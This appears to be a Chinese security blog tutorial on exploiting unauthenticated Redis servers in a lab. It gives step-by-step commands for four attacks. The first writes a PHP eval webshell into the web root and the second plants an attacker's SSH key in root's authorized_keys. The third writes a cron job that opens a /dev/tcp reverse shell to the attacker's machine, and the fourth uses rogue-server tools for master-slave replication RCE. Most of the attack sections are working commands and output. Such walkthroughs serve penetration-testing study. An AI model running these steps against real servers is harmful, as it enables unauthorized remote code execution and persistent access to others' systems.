+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">kali 2021:</span> <span class="number">192.168</span><span class="number">.15</span><span class="number">.131</span> <span class="string">+</span> <span class="string">redis</span></span><br><span class="line"><span class="attr">CentOS 7 :</span> <span class="number">192.168</span><span class="number">.15</span><span class="number">.129</span> <span class="string">+</span> <span class="string">redis</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Redis连接"><a href="#Redis连接" class="headerlink" title="Redis连接"></a>Redis连接</h3><h4 id="Linux下连接"><a href="#Linux下连接" class="headerlink" title="Linux下连接"></a>Linux下连接</h4><p>Linux下主要分为交互式连接方式以及命令连接方式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h &#123;host&#125; -p &#123;port&#125;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-10-31%20%E4%B8%8B%E5%8D%8811.18.01.png" alt="截屏2021-10-31 下午11.18.01"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h &#123;host&#125; -p &#123;port&#125; &#123;<span class="built_in">command</span>&#125;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-10-31%20%E4%B8%8B%E5%8D%8811.19.46.png" alt="截屏2021-10-31 下午11.19.46"></p>
+<h4 id="Windows下连接"><a href="#Windows下连接" class="headerlink" title="Windows下连接"></a>Windows下连接</h4><p><strong>下载地址：<a target="_blank" rel="noopener" href="https://github.com/ServiceStack/redis-windows">https://github.com/ServiceStack/redis-windows</a></strong><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/QQ%E6%88%AA%E5%9B%BE20210924172156.png" alt="QQ截图20210924172156"></p>
+<p>选择对应版本下载即可<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-10-31%20%E4%B8%8B%E5%8D%8811.32.39.png" alt="截屏2021-10-31 下午11.32.39"></p>
+<h3 id="Redis基础用法"><a href="#Redis基础用法" class="headerlink" title="Redis基础用法"></a>Redis基础用法</h3><p><strong>参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/kongzhongqijing/p/6867960.html">https://www.cnblogs.com/kongzhongqijing/p/6867960.html</a></strong><br>常见命令如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">info //查看信息</span><br><span class="line">flushall //删除所有数据库内容</span><br><span class="line">flushdb //刷新数据库</span><br><span class="line">KEYS * //查看所有键，使用select num可以查看键值数据</span><br><span class="line">set test &quot;whoami&quot; //设置变量</span><br><span class="line">config set dir dirpath //设置路径等配置</span><br><span class="line">config get dir/dbfilename //获取路径和数据配置信息</span><br><span class="line">save //保存</span><br><span class="line">get 变量 //查看变量名出</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-10-31%20%E4%B8%8B%E5%8D%8811.04.50.png" alt="截屏2021-10-31 下午11.04.50"></p>
+<h2 id="0x03-Redis渗透"><a href="#0x03-Redis渗透" class="headerlink" title="0x03 Redis渗透"></a>0x03 Redis渗透</h2><h3 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h3><p>Redis未授权主要因为配置不当导致未授权访问漏洞，攻击者可以进一步将恶意数据写入内存或磁盘当中，造成更大危害，同时Redis也可以将内存中的数据写入磁盘当中。主要原因如下：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">、配置登录策略导致任意机器都可以登录redis</span></span><br><span class="line"><span class="number">2</span><span class="string">、未设置密码或设置弱口令</span></span><br></pre></td></tr></table></figure>
+
+<p>测试靶机是否存在redis未授权访问漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis -h 192.168.15.131</span><br><span class="line">redis &gt; info</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-10-31%20%E4%B8%8B%E5%8D%8811.34.30.png" alt="截屏2021-10-31 下午11.34.30"></p>
+<p>如果能够直接查看到配置信息，那么说明存在未授权访问漏洞；如果提示需要输入密码，可能是目标机器上设置了密码。在实际环境下可以使用 hydra 进行爆破，如果出现无法连接的情况可能是因为<code>bind 127.0.0.1</code>未注释导致仅能通过本地访问或目标防火墙已开启。</p>
+<h3 id="Redis写webshell"><a href="#Redis写webshell" class="headerlink" title="Redis写webshell"></a>Redis写webshell</h3><h4 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> dir /var/www/html/ //切换目录到网站根目录</span><br><span class="line"><span class="built_in">set</span> x <span class="string">&quot;\n\n\n&lt;?php phpinfo();?&gt;\n\n\n&quot;</span> //将恶意代码写入内存中</span><br><span class="line"><span class="built_in">set</span> xx <span class="string">&quot;\n\n\n&lt;?php eval(<span class="variable">$_POST</span>[&#x27;mac&#x27;]);?&gt;\n\n\n&quot;</span> //将恶意代码写入内存中</span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php //在磁盘中生成木马文件</span><br><span class="line">save //将内存中的数据导出到磁盘文件</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-10-31%20%E4%B8%8B%E5%8D%8811.38.09.png" alt="截屏2021-10-31 下午11.38.09"></p>
+<h4 id="检查webshell"><a href="#检查webshell" class="headerlink" title="检查webshell"></a>检查webshell</h4><p>在 kali 中可编辑端口配置文件修改默认端口号</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apache2/ports.conf</span><br></pre></td></tr></table></figure>
+
+<p>开启 Apache 并在其目录发现木马<code>shell.php</code>已存在</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/apache2 start</span><br><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-10-31%20%E4%B8%8B%E5%8D%8811.48.36.png" alt="截屏2021-10-31 下午11.48.36"></p>
+<p>访问木马地址<code>http://192.168.15.131/shell.php</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2022-04-10%20%E4%B8%8A%E5%8D%883.25.46.png" alt="截屏2022-04-10 上午3.25.46"></p>
+<p>亦可使用蚁剑直接连接<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2022-04-10%2003.27.57.png" alt="截屏2022-04-10 03.27.57"></p>
+<h3 id="Redis写ssh密钥登录ssh"><a href="#Redis写ssh密钥登录ssh" class="headerlink" title="Redis写ssh密钥登录ssh"></a>Redis写ssh密钥登录ssh</h3><h4 id="开启ssh"><a href="#开启ssh" class="headerlink" title="开启ssh"></a>开启ssh</h4><p>在 kali 中开启 ssh 服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/ssh start</span><br><span class="line">service ssh start</span><br></pre></td></tr></table></figure>
+
+<p>检查 ssh 是否已开启</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ntlp</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%881.38.06.png" alt="截屏2021-11-01 上午1.38.06"></p>
+<p>修改redis密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 登录redis</span></span><br><span class="line">redis-cli -h 192.168.15.131</span><br><span class="line"><span class="comment"># 修改密码为macmac</span></span><br><span class="line">config <span class="built_in">set</span> requirepass macmac</span><br><span class="line"></span><br><span class="line">redis-cli -h 192.168.15.131 -a macmac</span><br><span class="line">也可以登录后使用auth命令进行认证</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%881.40.41.png" alt="截屏2021-11-01 上午1.40.41"></p>
+<h4 id="写入ssh密钥"><a href="#写入ssh密钥" class="headerlink" title="写入ssh密钥"></a>写入ssh密钥</h4><p>首先生成 ssh 密钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%882.03.38.png" alt="截屏2021-11-01 上午2.03.38"></p>
+<p>将key导出，添加<code>\n\n</code>防止乱码出现</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>;cat id_rsa.pub;<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; key.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%882.05.29.png" alt="截屏2021-11-01 上午2.05.29"></p>
+<p>将生成的公钥写入 redis 当中并查看公钥是否已写入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat key.txt | redis-cli -h 192.168.15.131 -a macmac -x <span class="built_in">set</span> xxx</span><br><span class="line"><span class="comment"># 查看是否写入</span></span><br><span class="line">keys *</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%882.08.00.png" alt="截屏2021-11-01 上午2.08.00"></p>
+<p>设置导出路径为 root 的<code>.ssh</code>目录下（本质是更改redis的备份路径）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> dir /root/.ssh</span><br></pre></td></tr></table></figure>
+<p><strong>注：假如<code>/root/.ssh</code>不存在，这里会显示失败，不会返回OK，可以创建.ssh文件夹来解决该问题</strong></p>
+<p>设置文件名为<code>authorized_keys</code>并导出</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%882.09.41.png" alt="截屏2021-11-01 上午2.09.41"></p>
+<h4 id="登录ssh"><a href="#登录ssh" class="headerlink" title="登录ssh"></a>登录ssh</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@192.168.15.131</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%882.10.55.png" alt="截屏2021-11-01 上午2.10.55"></p>
+<h4 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h4><p>这时可能有不明白的小伙伴就会问了：为什么在.ssh目录下写入<code>authorized_keys</code>就能登录目标的ssh呢？这是因为<code>authorized_keys</code>主要作为授权文件，将任意主机的公钥添加至该文件中就可在任意主机下实现无密码连接。</p>
+<h3 id="利用计划任务反弹shell"><a href="#利用计划任务反弹shell" class="headerlink" title="利用计划任务反弹shell"></a>利用计划任务反弹shell</h3><p>首先在本地开启监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 5555</span><br></pre></td></tr></table></figure>
+
+<p>在交互式连接方式中写入反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> xx <span class="string">&quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.15.131/5555 0&gt;&amp;1\n&quot;</span> //其中*代表计划任务的时间</span><br><span class="line">config <span class="built_in">set</span> dir /var/spool/cron/ //设置导出路径</span><br><span class="line">config <span class="built_in">set</span> dbfilename root //设置导出文件名为root</span><br><span class="line">save //保存</span><br></pre></td></tr></table></figure>
+
+<p>也可以直接通过命令连接方式写入反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.15.131/5555 0&gt;&amp;1\n\n&quot;</span>|redis-cli -h 192.168.0.104 -x <span class="built_in">set</span> 1</span><br><span class="line"></span><br><span class="line">redis-cli -h 192.168.15.129 config <span class="built_in">set</span> dir /var/spool/cron/ </span><br><span class="line">redis-cli -h 192.168.15.129 config <span class="built_in">set</span> dbfilename root </span><br><span class="line">redis-cli -h 192.168.15.129 save</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%882.16.22.png" alt="截屏2021-11-01 上午2.16.22"></p>
+<p>保存后成功反弹shell<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%882.16.13.png" alt="截屏2021-11-01 上午2.16.13"></p>
+<h3 id="主从复制RCE"><a href="#主从复制RCE" class="headerlink" title="主从复制RCE"></a>主从复制RCE</h3><p>由于未授权的 Redis 通过写文件来完成 getshell，而在执行过程中会产生一个问题：Redis 保存的数据是简单的json、csv 格式文件，因此写入的文件含有大量的无用数据。<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%884.57.39.png" alt="截屏2021-10-28 下午4.57.39"></p>
+<p>在以上利用 crontab、ssh key、webshell 这三种方式具有一定的容错性，同时 crontab、ssh 服务是服务器的标准命令和服务，因此很多情况下这种通过写文件的方式 getshell 是通杀的。但随着现代服务部署方式的不断发展，组件化成了不可逃避的大趋势。docker就是在该时代背景下的产物之一，在这种部署模式下，一个单一的容器中不会有除了 redis 以外的任何服务存在，包括 ssh 和 crontab，再加上权限的严格控制，所以单纯依靠写文件就很难getshell，在这种情况下我们就需要其他的利用手段。</p>
+<p>Redis 在 4.x、5.x 版本中提供了主从模式，主从模式指的是使用单个 redis 为主机，而将其他 redis 作为从机，主机和从机的数据都是一样的，主机只负责写，从机只负责读。在 Redis 4.x 版本后，通过外部扩展可以实现一个新的 Redis 命令来构造恶意 .so 文件，在两个 Redis 实例中设置主从模式的时候，主机可以通过 FULLRESYNC 同步文件到从机上，然后在从机上加载恶意 .so 文件即可执行命令。简单的说就是攻击者（主机）写一个 .so 文件，通过 FULLRESYNC 同步文件到受害者（从机）上。</p>
+<h4 id="主从复制工具下载"><a href="#主从复制工具下载" class="headerlink" title="主从复制工具下载"></a>主从复制工具下载</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/n0b0dyCN/redis-rogue-server //未授权 </span><br><span class="line">git <span class="built_in">clone</span> https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server //有密码</span><br></pre></td></tr></table></figure>
+<p>目标靶机不能开启保护模式，可通过<code>-h</code>来查看帮助信息<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%882.25.47.png" alt="截屏2021-11-01 上午2.25.47"></p>
+<p>后者相比前者多了一个认证过程<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%882.27.00.png" alt="截屏2021-11-01 上午2.27.00"></p>
+<h4 id="主从复制RCE-1"><a href="#主从复制RCE-1" class="headerlink" title="主从复制RCE"></a>主从复制RCE</h4><p>查看 redis 版本信息为 4.0.8<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%883.07.45.png" alt="截屏2021-11-01 上午3.07.45"></p>
+<p>通过以下命令进行反弹</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis_rogue_server.py -rhost 192.168.15.131 -lhost 192.168.15.129 -passwd macmac</span><br></pre></td></tr></table></figure>
+
+<p>成功进入后可选择shell，一共有两种方式，分别是交互模式以及反弹shell模式（需要设置本地本地IP和端口），我们选择交互模式</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%883.10.03.png" alt="截屏2021-11-01 上午3.10.03"></p>
+<p>如果选择反弹模式，前提是在本地开启监听，反弹成功可使用 python 调出 bash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 5555</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/dd582856/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8A%E5%8D%883.13.04.png" alt="截屏2021-11-01 上午3.13.04"></p>
